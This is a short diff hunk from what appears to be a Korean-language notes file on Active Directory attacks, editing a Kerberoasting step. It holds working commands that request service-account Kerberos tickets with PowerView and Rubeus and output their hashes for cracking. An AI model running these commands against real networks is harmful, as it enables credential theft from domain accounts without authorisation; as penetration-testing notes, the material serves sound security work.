@@ -475,7 +475,7 @@ Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfre
 .\rubeus.exe tgtdeleg /nowrap
 
 # 현재 사용자의 계정으로 커버로스팅 공격 시도.
-.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
+.\Rubeus.exe kerberoast /nowrap
 ```
 
 ```powershell
